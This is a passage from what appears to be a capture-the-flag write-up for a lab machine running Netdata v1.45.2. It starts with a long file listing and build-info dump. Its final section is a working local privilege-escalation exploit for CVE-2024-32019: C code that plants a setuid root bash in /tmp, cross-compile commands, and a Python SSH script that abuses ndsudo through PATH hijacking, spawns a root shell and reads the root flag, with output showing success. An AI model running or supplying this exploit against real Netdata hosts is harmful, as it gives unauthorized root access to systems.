/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mdflush.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_softirq.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_disk.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_msync.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_zfs.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fsync.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_softirq.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_dc.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_oomkill.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_ext4.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_shm.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mount.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_process.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mount.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_nfs.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_xfs.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mount.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mdflush.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fsync.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_zfs.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mount.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fd.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fsync.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fsync.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fd.5.11.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_softirq.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_socket.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_swap.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_hardirq.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_ext4.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_syncfs.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fdatasync.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_cachestat.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_msync.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_vfs.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_socket.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_hardirq.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_xfs.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_cachestat.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_syncfs.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_msync.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_syncfs.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_hardirq.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_shm.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_cachestat.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_softirq.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_msync.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_dc.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_softirq.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_ext4.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_swap.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_btrfs.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mdflush.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fdatasync.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fd.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_dc.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_oomkill.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_xfs.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_shm.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_hardirq.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_vfs.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_vfs.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_cachestat.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync_file_range.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_cachestat.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_nfs.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_swap.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fd.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_cachestat.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_btrfs.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mdflush.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fdatasync.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_swap.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mdflush.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_cachestat.5.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_zfs.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_disk.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_oomkill.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_network_viewer.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_btrfs.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_btrfs.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mdflush.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_process.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_vfs.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_btrfs.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mdflush.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_syncfs.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_network_viewer.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_network_viewer.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_btrfs.5.10.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync_file_range.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_xfs.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync_file_range.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_dc.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_zfs.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_syncfs.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_oomkill.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_vfs.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_softirq.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fdatasync.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_zfs.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_syncfs.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_msync.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_zfs.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_dc.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_sync_file_range.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fd.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fd.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_process.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_network_viewer.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_xfs.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mdflush.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_mdflush.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_shm.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_cachestat.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_process.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_shm.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_xfs.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_hardirq.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_nfs.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_cachestat.5.15.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_socket.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_oomkill.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_process.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_socket.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fsync.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_network_viewer.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_zfs.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_oomkill.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_dc.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_disk.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fd.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_sync.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_process.4.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_nfs.4.16.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fsync.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_msync.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_oomkill.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_btrfs.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_fdatasync.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_ext4.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_nfs.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_disk.5.14.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_btrfs.5.10.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_nfs.5.4.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_mount.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_fdatasync.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/pnetdata_ebpf_xfs.4.18.o
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.d/rnetdata_ebpf_nfs.5.14.o
/dev/shm/netdata_sem_cgroup_ebpf
/dev/shm/netdata_shm_cgroup_ebpf
total 32K
drwxr-xr-x 8 root    root    4.0K Jul  8  2025 .
drwxr-xr-x 4 root    root    4.0K Jul  8  2025 ..
drwxr-xr-x 3 root    root    4.0K Jul  8  2025 bin
drwxr-xr-x 3 root    root    4.0K Jul  8  2025 etc
lrwxrwxrwx 1 root    root      11 Jun 15  2025 netdata-configs -> etc/netdata
lrwxrwxrwx 1 root    root      15 Jun 15  2025 netdata-dbs -> var/lib/netdata
lrwxrwxrwx 1 root    root      15 Jun 15  2025 netdata-logs -> var/log/netdata
lrwxrwxrwx 1 root    root      17 Jun 15  2025 netdata-metrics -> var/cache/netdata
lrwxrwxrwx 1 root    root      19 Jun 15  2025 netdata-plugins -> usr/libexec/netdata
lrwxrwxrwx 1 root    root      21 Jun 15  2025 netdata-web-files -> usr/share/netdata/web
lrwxrwxrwx 1 root    root       3 Jun 15  2025 sbin -> bin
drwxr-xr-x 6 root    root    4.0K Jul  8  2025 share
drwxr-xr-x 2 root    root    4.0K Jul  8  2025 system
drwxr-xr-x 5 root    root    4.0K Jul  8  2025 usr
drwxr-xr-x 6 netdata netdata 4.0K Jul  8  2025 var
Packaging:
    Netdata Version ____________________________________________ : v1.45.2
    Installation Type __________________________________________ : manual-static
    Package Architecture _______________________________________ : x86_64
    Package Distro _____________________________________________ : unknown
    Configure Options __________________________________________ : dummy-configure-command
Default Directories:
    User Configurations ________________________________________ : /opt/netdata/etc/netdata
    Stock Configurations _______________________________________ : /opt/netdata/usr/lib/netdata/conf.d
    Ephemeral Databases (metrics data, metadata) _______________ : /opt/netdata/var/cache/netdata
    Permanent Databases ________________________________________ : /opt/netdata/var/lib/netdata
    Plugins ____________________________________________________ : /opt/netdata/usr/libexec/netdata/plugins.d
    Static Web Files ___________________________________________ : /opt/netdata/usr/share/netdata/web
    Log Files __________________________________________________ : /opt/netdata/var/log/netdata
    Lock Files _________________________________________________ : /opt/netdata/var/lib/netdata/lock
    Home _______________________________________________________ : /opt/netdata/var/lib/netdata
Operating System:
    Kernel _____________________________________________________ : Linux
    Kernel Version _____________________________________________ : 5.15.0-151-generic
    Operating System ___________________________________________ : Ubuntu
    Operating System ID ________________________________________ : ubuntu
    Operating System ID Like ___________________________________ : debian
    Operating System Version ___________________________________ : 22.04.5 LTS (Jammy Jellyfish)
    Operating System Version ID ________________________________ : none
    Detection __________________________________________________ : /etc/os-release
Hardware:
    CPU Cores __________________________________________________ : 2
    CPU Frequency ______________________________________________ : 2445000000
    RAM Bytes __________________________________________________ : 4101853184
    Disk Capacity ______________________________________________ : 9663676416
    CPU Architecture ___________________________________________ : x86_64
    Virtualization Technology __________________________________ : vmware
    Virtualization Detection ___________________________________ : systemd-detect-virt
Container:
    Container __________________________________________________ : none
    Container Detection ________________________________________ : systemd-detect-virt
    Container Orchestrator _____________________________________ : none
    Container Operating System _________________________________ : none
    Container Operating System ID ______________________________ : none
    Container Operating System ID Like _________________________ : none
    Container Operating System Version _________________________ : none
    Container Operating System Version ID ______________________ : none
    Container Operating System Detection _______________________ : none
Features:
    Built For __________________________________________________ : Linux
    Netdata Cloud ______________________________________________ : YES
    Health (trigger alerts and send notifications) _____________ : YES
    Streaming (stream metrics to parent Netdata servers) _______ : YES
    Back-filling (of higher database tiers) ____________________ : YES
    Replication (fill the gaps of parent Netdata servers) ______ : YES
    Streaming and Replication Compression ______________________ : YES (zstd lz4 gzip)
    Contexts (index all active and archived metrics) ___________ : YES
    Tiering (multiple dbs with different metrics resolution) ___ : YES (5)
    Machine Learning ___________________________________________ : YES
Database Engines:
    dbengine ___________________________________________________ : YES
    alloc ______________________________________________________ : YES
    ram ________________________________________________________ : YES
    none _______________________________________________________ : YES
Connectivity Capabilities:
    ACLK (Agent-Cloud Link: MQTT over WebSockets over TLS) _____ : YES
    static (Netdata internal web server) _______________________ : YES
    h2o (web server) ___________________________________________ : YES
    WebRTC (experimental) ______________________________________ : NO
    Native HTTPS (TLS Support) _________________________________ : YES
    TLS Host Verification ______________________________________ : YES
Libraries:
    LZ4 (extremely fast lossless compression algorithm) ________ : YES
    ZSTD (fast, lossless compression algorithm) ________________ : YES
    zlib (lossless data-compression library) ___________________ : YES
    Brotli (generic-purpose lossless compression algorithm) ____ : NO
    protobuf (platform-neutral data serialization protocol) ____ : YES (system)
    OpenSSL (cryptography) _____________________________________ : YES
    libdatachannel (stand-alone WebRTC data channels) __________ : NO
    JSON-C (lightweight JSON manipulation) _____________________ : YES
    libcap (Linux capabilities system operations) ______________ : NO
    libcrypto (cryptographic functions) ________________________ : YES
    libyaml (library for parsing and emitting YAML) ____________ : YES
Plugins:
    apps (monitor processes) ___________________________________ : YES
    cgroups (monitor containers and VMs) _______________________ : YES
    cgroup-network (associate interfaces to CGROUPS) ___________ : YES
    proc (monitor Linux systems) _______________________________ : YES
    tc (monitor Linux network QoS) _____________________________ : YES
    diskspace (monitor Linux mount points) _____________________ : YES
    freebsd (monitor FreeBSD systems) __________________________ : NO
    macos (monitor MacOS systems) ______________________________ : NO
    statsd (collect custom application metrics) ________________ : YES
    timex (check system clock synchronization) _________________ : YES
    idlejitter (check system latency and jitter) _______________ : YES
    bash (support shell data collection jobs - charts.d) _______ : YES
    debugfs (kernel debugging metrics) _________________________ : YES
    cups (monitor printers and print jobs) _____________________ : NO
    ebpf (monitor system calls) ________________________________ : YES
    freeipmi (monitor enterprise server H/W) ___________________ : NO
    nfacct (gather netfilter accounting) _______________________ : YES
    perf (collect kernel performance events) ___________________ : YES
    slabinfo (monitor kernel object caching) ___________________ : YES
    Xen ________________________________________________________ : NO
    Xen VBD Error Tracking _____________________________________ : NO
    Logs Management ____________________________________________ : NO
Exporters:
    AWS Kinesis ________________________________________________ : NO
    GCP PubSub _________________________________________________ : NO
    MongoDB ____________________________________________________ : NO
    Prometheus (OpenMetrics) Exporter __________________________ : YES
    Prometheus Remote Write ____________________________________ : YES
    Graphite ___________________________________________________ : YES
    Graphite HTTP / HTTPS ______________________________________ : YES
    JSON _______________________________________________________ : YES
    JSON HTTP / HTTPS __________________________________________ : YES
    OpenTSDB ___________________________________________________ : YES
    OpenTSDB HTTP / HTTPS ______________________________________ : YES
    All Metrics API ____________________________________________ : YES
    Shell (use metrics in shell scripts) _______________________ : YES
Debug/Developer Features:
    Trace All Netdata Allocations (with charts) ________________ : NO
    Developer Mode (more runtime checks, slower) _______________ : NO
```

## Shell as `root`

Exploit `CVE-2024-32019`

- <https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93>

PoC

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>

int main() {
    setuid(0);
    seteuid(0);
    setgid(0);
    setegid(0);
    system("cp /bin/bash /tmp/bash; chown root:root /tmp/bash; chmod 6777 /tmp/bash");
    printf("Exploit executed. A setuid root shell has been created at /tmp/bash\n");
    return 0;
}
```

We can cross-compile the exploit on macOS

```bash
docker run --rm dockcross/linux-x64 > ./dockcross
chmod +x dockcross
./dockcross gcc -o nvme exploit.c
```

```python
from pathlib import Path

import asyncssh

from common import get_stdout, hide_flag

USERNAME = "oliver"
if USERNAME not in CREDENTIALS:
    raise ValueError(f"Credentials for user '{USERNAME}' not found")
PASSWORD = CREDENTIALS[USERNAME]

EXPLOIT_BIN_PATH = Path("editor.htb/nvme")
if not EXPLOIT_BIN_PATH.exists():
    raise FileNotFoundError(f"Exploit binary not found at path: {EXPLOIT_BIN_PATH}")

await asyncssh.scp(
    EXPLOIT_BIN_PATH,
    (TARGET_HOST, "/home/oliver/nvme"),
    username=USERNAME,
    password=PASSWORD,
    known_hosts=None,
)

async with asyncssh.connect(TARGET_HOST, username=USERNAME, password=PASSWORD) as conn:
    result = await conn.run("file /home/oliver/nvme", check=True)
    print(get_stdout(result), end="")

    result = await conn.run(
        "PATH=/home/oliver /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list",
    )
    print("[*]", get_stdout(result), end="")

    async with conn.create_process("/tmp/bash -p") as process:
        print("[*] Spawned interactive shell, running id ...")
        process.stdin.write("id\n")
        await process.stdin.drain()  # Ensure the command is sent to the process
        output = await process.stdout.readline()
        print("[+] Current user:", output.strip())

        process.stdin.write("cat /root/root.txt\n")
        await process.stdin.drain()
        output = await process.stdout.readline()
        print("[+] Root flag:", hide_flag(output.strip()))
```

Output:

```txt
/home/oliver/nvme: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4eb02ae3d5e3ea578d0d27e9b5213d09ee5dfc1e, for GNU/Linux 3.2.0, not stripped
[*] Exploit executed. A setuid root shell has been created at /tmp/bash
[*] Spawned interactive shell, running id ...
[+] Current user: uid=1000(oliver) gid=1000(oliver) euid=0(root) egid=0(root) groups=0(root),999(netdata),1000(oliver)
[+] Root flag: bc46...ebb0b
```
